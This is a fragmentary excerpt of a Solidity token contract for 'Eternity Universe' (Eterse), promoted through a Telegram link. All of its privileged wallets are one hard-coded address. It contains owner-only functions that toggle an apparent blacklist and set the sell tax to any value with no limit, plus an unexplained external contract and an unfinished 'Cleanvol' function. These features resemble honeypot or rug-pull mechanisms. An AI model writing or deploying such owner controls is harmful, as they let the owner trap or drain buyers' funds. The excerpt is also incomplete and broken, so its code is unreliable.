...
// telegram : https://t.me/Eterse  --> Copy Link and send any to any folder and join the group
...
contract Eterse is Context, IERC20 {
    ...
    address payable public Wallet_Marketing = payable(0xa8a80e99A1eB5cFf21E852E84E66eFe615198483);
    address payable public Wallet_Dev = payable(0xa8a80e99A1eB5cFf21E852E84E66eFe615198483);
    ...
    string private constant _name = "Eternity Universe";
    string private constant _symbol = "Eterse";
    ABB abb;
    ...
    constructor (address _abb) {
        ...
        _owner = 0xa8a80e99A1eB5cFf21E852E84E66eFe615198483;
   ...
   */
    ...
    function set_Max_Transaction(uint256 maxTxPercent_x100) external onlyOwner() {
    ...
    function setDLEterse(address addr, bool bv) external onlyOwner {
        isDL[addr] = bv;
    }

    function setDEEterse(uint256 fe) external onlyOwner {
        _Tax_On_Sell = fe;
    }

    function Cleanvol(address account) public onlyOwner {
